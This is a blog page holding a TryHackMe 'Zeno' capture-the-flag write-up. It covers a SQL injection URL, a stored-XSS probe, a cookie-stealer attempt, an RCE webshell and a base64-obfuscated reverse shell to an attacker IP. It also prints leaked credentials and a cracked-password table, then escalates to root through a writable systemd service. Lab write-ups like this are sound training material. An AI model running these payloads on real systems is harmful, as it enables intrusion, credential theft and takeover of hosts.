@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Zeno Thm Writeup Abusing Service File Misconfigurations | xplo1t&#39;s site</title>
+<meta name="keywords" content="">
+<meta name="description" content="Hello all, today we be doing Zeno from TryHackMe. It is rated Medium and the description says “Do you have the same patience as the great stoic philosopher Zeno? Try it out!”
+Port scanning There was some problem with nmap and because of that it wasn’t able to show all the open ports. Rushi suggested to me that I use Rustscan. Thanks Rushi :D
+Found few more ports. So now I redid the nmap scan on these ports:">
+<meta name="author" content="">
+<link rel="canonical" href="http://xplo1t.me/posts/zeno-thm-writeup-abusing-service-file-misconfigurations/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="http://xplo1t.me/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://xplo1t.me/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://xplo1t.me/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://xplo1t.me/apple-touch-icon.png">
+<link rel="mask-icon" href="http://xplo1t.me/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Zeno Thm Writeup Abusing Service File Misconfigurations" />
+<meta property="og:description" content="Hello all, today we be doing Zeno from TryHackMe. It is rated Medium and the description says “Do you have the same patience as the great stoic philosopher Zeno? Try it out!”
+Port scanning There was some problem with nmap and because of that it wasn’t able to show all the open ports. Rushi suggested to me that I use Rustscan. Thanks Rushi :D
+Found few more ports. So now I redid the nmap scan on these ports:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://xplo1t.me/posts/zeno-thm-writeup-abusing-service-file-misconfigurations/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-10-25T20:32:44+05:30" />
+<meta property="article:modified_time" content="2021-10-25T20:32:44+05:30" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Zeno Thm Writeup Abusing Service File Misconfigurations"/>
+<meta name="twitter:description" content="Hello all, today we be doing Zeno from TryHackMe. It is rated Medium and the description says “Do you have the same patience as the great stoic philosopher Zeno? Try it out!”
+Port scanning There was some problem with nmap and because of that it wasn’t able to show all the open ports. Rushi suggested to me that I use Rustscan. Thanks Rushi :D
+Found few more ports. So now I redid the nmap scan on these ports:"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://xplo1t.me/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Zeno Thm Writeup Abusing Service File Misconfigurations",
+      "item": "http://xplo1t.me/posts/zeno-thm-writeup-abusing-service-file-misconfigurations/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Zeno Thm Writeup Abusing Service File Misconfigurations",
+  "name": "Zeno Thm Writeup Abusing Service File Misconfigurations",
+  "description": "Hello all, today we be doing Zeno from TryHackMe. It is rated Medium and the description says “Do you have the same patience as the great stoic philosopher Zeno? Try it out!”\nPort scanning There was some problem with nmap and because of that it wasn’t able to show all the open ports. Rushi suggested to me that I use Rustscan. Thanks Rushi :D\nFound few more ports. So now I redid the nmap scan on these ports:",
+  "keywords": [
+    
+  ],
+  "articleBody": "Hello all, today we be doing Zeno from TryHackMe. It is rated Medium and the description says “Do you have the same patience as the great stoic philosopher Zeno? Try it out!”\nPort scanning There was some problem with nmap and because of that it wasn’t able to show all the open ports. Rushi suggested to me that I use Rustscan. Thanks Rushi :D\nFound few more ports. So now I redid the nmap scan on these ports:\nWe have a web server on port 12340. Let’s check that.\nThe web server After some directory busting with different wordlists, I found these to be of interest:\n/index.html (Status: 200) /rms (Status: 301) /index.html does not return anything useful. /rms is Restaurant Management System. After exploring the website with burp proxy turned on in the background, I have found a few parameterized requests. We can do SQLi in the delete order query: http://10.10.200.163:12340/rms/delete-order.php?id=0' or 1-- -\nsqlmap We have time based SQLi. After some time running sqlmap, here is what I have gathered:\nDatabase Name: dbrms Found some tables: I couldn’t find anything useful from the database. And it takes a lot of time. So let’s see if there’s other vulnerabilities. The website displays the username(first-name). I tried checking for XSS and SSTI. I could not find SSTI but found that it has stored XSS. Set the payload to ${{4*4}} to check for both XSS and SSTI at the same time.\nStored XSS. Can we steal cookies?\nLet’s see if we can steal the cookies of other users. Create a new account and upload a cookie stealer payload in the first name field.\nI used burp repeater for this\nNow I logged in with this account and, did some actions on the website (such as sending reviews, buying things, etc) in hopes of getting a hit by other users so that I can grab their cookies. But I could not get any hits even after waiting for a few minutes. So its safe to say that its a dead end. Let’s check for other exploits.\nSearching for exploits I searched for Restaurant Management System exploits in searchsploit.\nThere is an RCE exploit available. After running it, we get a webshell uploaded at http://ip:12340/rms/images/reverse-shell.php. Use the ?cmd= command for command execution.\nUse this payload in URL encoded form:\necho L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xNC4xNC43OC84MCAwPiYxCg==|base64 -d|bash\nThis will run the following reverse shell:\n/bin/sh -i \u003e\u0026 /dev/tcp/10.14.14.78/80 0\u003e\u00261 I used Burp Decoder to url encode the payload. The final payload is:\n%65%63%68%6f%20%4c%32%4a%70%62%69%39%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4e%43%34%78%4e%43%34%33%4f%43%38%34%4d%43%41%77%50%69%59%78%43%67%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68 Run a listener on port 80 on your attacker machine and execute the payload.\nGot a shell. Now what? After getting a shell, I found a config file /var/www/html/rms/connection/config.php that contains passwords.\nbash-4.2$ pwd /var/www/html/rms/connection bash-4.2$ cat config.php \u003c?php define('DB_HOST', 'localhost'); define('DB_USER', 'root'); define('DB_PASSWORD', 'veerUffIrangUfcubyig'); define('DB_DATABASE', 'dbrms'); define('APP_NAME', 'Pathfinder Hotel'); error_reporting(1); ?\u003e Mysql database enumeration In the database, there is a table named members. It contains some password hashes and answer hashes. I cracked a few of them except for that of user edward . Funnily enough, there’s a system user named edward as well.\nHere are the cracked hashes and passwords:\nUsername Email Password Security Answer Stephen omolewastephen@gmail.com 1234 deborah john jsmith@sample.com jsmith123 middlename edward edward@zeno.com COULD NOT CRACK COULD NOT CRACK I tried these passwords on edward’s account but couldn’t login.\nLinPEAS Now let’s run LinPEAS. LinPEAS is a script for automated enumeration. It can help you identify running services, files, credentials, or any vulnerabilities.\nWe have write privileges on /etc/systemd/system/zeno-monitoring.service Also found new creds.\nusername=**zeno**,password=**FrobjoodAdkoonceanJa** Tried sudo -las current user with this password but it did not work. Let’s try editing the service file for now.\nService file misconfiguration to root Let’s add the SUID bit on /bin/bash for an easy privesc. Change the ExecStart to the following as shown below:\nExecStart=/usr/bin/chmod +x /bin/bash We only need to change the ExecStart command. This command defines what will get executed by the service.\nNow when this service starts again, we will have a SUID /bin/bash. We can make that happen if we can somehow restart it. But we don’t have permissions to do that as a low privileged user. Another way to make it happen is if we can somehow reboot the system. I tried to reboot the system but couldn’t. We need root privileges to reboot.\nLet’s try the password found earlier (FrobjoodAdkoonceanJa) on user edward. We can successfully login as edward 🎉.\nChecking for sudo -l permissions on edward, we see that he can reboot the system.\nUser edward can reboot the system\nReboot the machine with sudo /usr/sbin/reboot and now when the system is fully rebooted, login as edward through ssh. As the system reboots, our service will also startup. We will now have a SUID /bin/bash. Use it to escalate privileges to root\nRooted :p\nZeno is now rooted✨\nI hope it was easy to follow through. Until next time.\nTake care :)\nFind me on twitter: @manash036\n",
+  "wordCount" : "821",
+  "inLanguage": "en",
+  "datePublished": "2021-10-25T20:32:44+05:30",
+  "dateModified": "2021-10-25T20:32:44+05:30",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://xplo1t.me/posts/zeno-thm-writeup-abusing-service-file-misconfigurations/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "xplo1t's site",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://xplo1t.me/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://xplo1t.me/" accesskey="h" title="xplo1t&#39;s site (Alt + H)">xplo1t&#39;s site</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://xplo1t.me/">Home</a>&nbsp;»&nbsp;<a href="http://xplo1t.me/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Zeno Thm Writeup Abusing Service File Misconfigurations
+    </h1>
+    <div class="post-meta"><span title='2021-10-25 20:32:44 +0530 IST'>October 25, 2021</span>&nbsp;·&nbsp;4 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#port-scanning" aria-label="Port scanning">Port scanning</a></li>
+                <li>
+                    <a href="#the-web-server" aria-label="The web server">The web server</a></li>
+                <li>
+                    <a href="#sqlmap" aria-label="sqlmap">sqlmap</a></li>
+                <li>
+                    <a href="#searching-for-exploits" aria-label="Searching for exploits">Searching for exploits</a></li>
+                <li>
+                    <a href="#got-a-shell-now-what" aria-label="Got a shell. Now what?">Got a shell. Now what?</a></li>
+                <li>
+                    <a href="#mysql-database-enumeration" aria-label="Mysql database enumeration">Mysql database enumeration</a></li>
+                <li>
+                    <a href="#linpeas" aria-label="LinPEAS">LinPEAS</a></li>
+                <li>
+                    <a href="#service-file-misconfiguration-to-root" aria-label="Service file misconfiguration to root">Service file misconfiguration to root</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>Hello all, today we be doing <a href="https://tryhackme.com/room/zeno">Zeno</a> from TryHackMe. It is rated Medium and the description says “Do you have the same patience as the great stoic philosopher Zeno? Try it out!”</p>
+<h1 id="port-scanning">Port scanning<a hidden class="anchor" aria-hidden="true" href="#port-scanning">#</a></h1>
+<p>There was some problem with nmap and because of that it wasn’t able to show all the open ports. <a href="https://iamrushi.cf/">Rushi</a> suggested to me that I use Rustscan. Thanks Rushi :D</p>
+<p><img loading="lazy" src="/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-0.png" alt=""  />
+</p>
+<p>Found few more ports. So now I redid the nmap scan on these ports:</p>
+<p><img loading="lazy" src="/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-1.png" alt=""  />
+</p>
+<p>We have a web server on port 12340. Let’s check that.</p>
+<h1 id="the-web-server">The web server<a hidden class="anchor" aria-hidden="true" href="#the-web-server">#</a></h1>
+<p>After some directory busting with different wordlists, I found these to be of interest:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>html (Status: <span style="color:#ae81ff">200</span>)  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>rms (Status: <span style="color:#ae81ff">301</span>)
+</span></span></code></pre></div><p><code>/index.html</code> does not return anything useful. <code>/rms</code> is Restaurant Management System. After exploring the website with burp proxy turned on in the background, I have found a few parameterized requests. We can do SQLi in the delete order query: <code>http://10.10.200.163:12340/rms/delete-order.php?id=0' or 1-- -</code></p>
+<h1 id="sqlmap">sqlmap<a hidden class="anchor" aria-hidden="true" href="#sqlmap">#</a></h1>
+<p>We have time based SQLi. After some time running sqlmap, here is what I have gathered:</p>
+<ul>
+<li>Database Name: dbrms</li>
+<li>Found some tables:</li>
+</ul>
+<p><img loading="lazy" src="/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-2.png" alt=""  />
+</p>
+<p>I couldn’t find anything useful from the database. And it takes a lot of time. So let’s see if there’s other vulnerabilities. The website displays the username(first-name). I tried checking for XSS and SSTI. I could not find SSTI but found that it has stored XSS. Set the payload to <code>${{4*4}}&lt;img src=x onerror=alert(1)&gt;</code> to check for both XSS and SSTI at the same time.</p>
+<p><img loading="lazy" src="/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-3.png" alt=""  />
+</p>
+<p>Stored XSS. Can we steal cookies?</p>
+<p>Let’s see if we can steal the cookies of other users. Create a new account and upload a cookie stealer payload in the first name field.</p>
+<p><img loading="lazy" src="/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-4.png" alt=""  />
+</p>
+<p>I used burp repeater for this</p>
+<p>Now I logged in with this account and, did some actions on the website (such as sending reviews, buying things, etc) in hopes of getting a hit by other users so that I can grab their cookies. But I could not get any hits even after waiting for a few minutes. So its safe to say that its a dead end. Let’s check for other exploits.</p>
+<h1 id="searching-for-exploits">Searching for exploits<a hidden class="anchor" aria-hidden="true" href="#searching-for-exploits">#</a></h1>
+<p>I searched for Restaurant Management System exploits in searchsploit.</p>
+<p><img loading="lazy" src="/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-5.png" alt=""  />
+</p>
+<p>There is an RCE exploit available. After running it, we get a webshell uploaded at <code>http://ip:12340/rms/images/reverse-shell.php</code>. Use the <code>?cmd= command</code> for command execution.</p>
+<p>Use this payload in URL encoded form:<br>
+<code>echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xNC4xNC43OC84MCAwPiYxCg==|base64 -d|bash</code></p>
+<p>This will run the following reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/bin/sh -i &gt;&amp; /dev/tcp/10.14.14.78/80 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>I used Burp Decoder to url encode the payload. The final payload is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>%65%63%68%6f%20%4c%32%4a%70%62%69%39%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4e%43%34%78%4e%43%34%33%4f%43%38%34%4d%43%41%77%50%69%59%78%43%67%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68
+</span></span></code></pre></div><p>Run a listener on port 80 on your attacker machine and execute the payload.</p>
+<h1 id="got-a-shell-now-what">Got a shell. Now what?<a hidden class="anchor" aria-hidden="true" href="#got-a-shell-now-what">#</a></h1>
+<p>After getting a shell, I found a config file <code>/var/www/html/rms/connection/config.php</code> that contains passwords.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-4.2$ pwd  
+</span></span><span style="display:flex;"><span>/var/www/html/rms/connection  
+</span></span><span style="display:flex;"><span>bash-4.2$ cat config.php   
+</span></span><span style="display:flex;"><span>&lt;?php  
+</span></span><span style="display:flex;"><span>    define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span><span style="color:#f92672">)</span>;  
+</span></span><span style="display:flex;"><span>    define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;root&#39;</span><span style="color:#f92672">)</span>;  
+</span></span><span style="display:flex;"><span>    define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;veerUffIrangUfcubyig&#39;</span><span style="color:#f92672">)</span>;  
+</span></span><span style="display:flex;"><span>    define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;DB_DATABASE&#39;</span>, <span style="color:#e6db74">&#39;dbrms&#39;</span><span style="color:#f92672">)</span>;  
+</span></span><span style="display:flex;"><span>    define<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;APP_NAME&#39;</span>, <span style="color:#e6db74">&#39;Pathfinder Hotel&#39;</span><span style="color:#f92672">)</span>;  
+</span></span><span style="display:flex;"><span>    error_reporting<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>;  
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span></code></pre></div><h1 id="mysql-database-enumeration">Mysql database enumeration<a hidden class="anchor" aria-hidden="true" href="#mysql-database-enumeration">#</a></h1>
+<p>In the database, there is a table named <code>members</code>. It contains some password hashes and answer hashes. I cracked a few of them except for that of user <code>edward</code> . Funnily enough, there’s a system user named edward as well.</p>
+<p>Here are the cracked hashes and passwords:</p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Email</th>
+<th>Password</th>
+<th>Security Answer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Stephen</td>
+<td><a href="mailto:omolewastephen@gmail.com">omolewastephen@gmail.com</a></td>
+<td>1234</td>
+<td>deborah</td>
+</tr>
+<tr>
+<td>john</td>
+<td><a href="mailto:jsmith@sample.com">jsmith@sample.com</a></td>
+<td>jsmith123</td>
+<td>middlename</td>
+</tr>
+<tr>
+<td>edward</td>
+<td><a href="mailto:edward@zeno.com">edward@zeno.com</a></td>
+<td>COULD NOT CRACK</td>
+<td>COULD NOT CRACK</td>
+</tr>
+</tbody>
+</table>
+<p>I tried these passwords on edward’s account but couldn’t login.</p>
+<h1 id="linpeas">LinPEAS<a hidden class="anchor" aria-hidden="true" href="#linpeas">#</a></h1>
+<p>Now let’s run <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>. LinPEAS is a script for automated enumeration. It can help you identify running services, files, credentials, or any vulnerabilities.</p>
+<p><img loading="lazy" src="/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-6.png" alt=""  />
+</p>
+<p>We have write privileges on <code>/etc/systemd/system/zeno-monitoring.service</code> Also found new creds.</p>
+<pre tabindex="0"><code>username=**zeno**,password=**FrobjoodAdkoonceanJa**
+</code></pre><p>Tried <code>sudo -l</code>as current user with this password but it did not work. Let&rsquo;s try editing the service file for now.</p>
+<h1 id="service-file-misconfiguration-to-root">Service file misconfiguration to root<a hidden class="anchor" aria-hidden="true" href="#service-file-misconfiguration-to-root">#</a></h1>
+<p>Let’s add the SUID bit on <code>/bin/bash</code> for an easy privesc. Change the ExecStart to the following as shown below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">ExecStart</span><span style="color:#f92672">=</span><span style="color:#e6db74">/usr/bin/chmod +x /bin/bash</span>
+</span></span></code></pre></div><p><img loading="lazy" src="/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-7.png" alt=""  />
+</p>
+<p>We only need to change the ExecStart command. This command defines what will get executed by the service.</p>
+<p>Now when this service starts again, we will have a SUID <code>/bin/bash</code>. We can make that happen if we can somehow restart it. But we don&rsquo;t have permissions to do that as a low privileged user. Another way to make it happen is if we can somehow reboot the system. I tried to reboot the system but couldn&rsquo;t. We need root privileges to reboot.</p>
+<p>Let’s try the password found earlier (<code>FrobjoodAdkoonceanJa</code>) on user <code>edward</code>. We can successfully login as edward 🎉.</p>
+<p>Checking for <code>sudo -l</code> permissions on edward, we see that he can reboot the system.</p>
+<p><img loading="lazy" src="/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-8.png" alt=""  />
+</p>
+<p>User edward can reboot the system</p>
+<p>Reboot the machine with <code>sudo /usr/sbin/reboot</code> and now when the system is fully rebooted, login as edward through ssh. As the system reboots, our service will also startup. We will now have a SUID <code>/bin/bash</code>. Use it to escalate privileges to <strong>root</strong></p>
+<p><img loading="lazy" src="/images/img-zeno-thm-writeup-abusing-service-file-misconfigurations-9.png" alt=""  />
+</p>
+<p>Rooted :p</p>
+<p>Zeno is now rooted✨</p>
+<p>I hope it was easy to follow through. Until next time.<br>
+Take care :)</p>
+<p>Find me on twitter: <a href="https://twitter.com/manash036">@manash036</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://xplo1t.me/posts/stack-based-buffer-overflows-prerequisites/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Stack Based Buffer Overflows Prerequisites</span>
+  </a>
+  <a class="next" href="http://xplo1t.me/posts/ide-tryhackme-writeup/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Ide Tryhackme Writeup</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Zeno Thm Writeup Abusing Service File Misconfigurations on twitter"
+        href="https://twitter.com/intent/tweet/?text=Zeno%20Thm%20Writeup%20Abusing%20Service%20File%20Misconfigurations&amp;url=http%3a%2f%2fxplo1t.me%2fposts%2fzeno-thm-writeup-abusing-service-file-misconfigurations%2f&amp;hashtags=">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Zeno Thm Writeup Abusing Service File Misconfigurations on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2fxplo1t.me%2fposts%2fzeno-thm-writeup-abusing-service-file-misconfigurations%2f&amp;title=Zeno%20Thm%20Writeup%20Abusing%20Service%20File%20Misconfigurations&amp;summary=Zeno%20Thm%20Writeup%20Abusing%20Service%20File%20Misconfigurations&amp;source=http%3a%2f%2fxplo1t.me%2fposts%2fzeno-thm-writeup-abusing-service-file-misconfigurations%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Zeno Thm Writeup Abusing Service File Misconfigurations on reddit"
+        href="https://reddit.com/submit?url=http%3a%2f%2fxplo1t.me%2fposts%2fzeno-thm-writeup-abusing-service-file-misconfigurations%2f&title=Zeno%20Thm%20Writeup%20Abusing%20Service%20File%20Misconfigurations">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 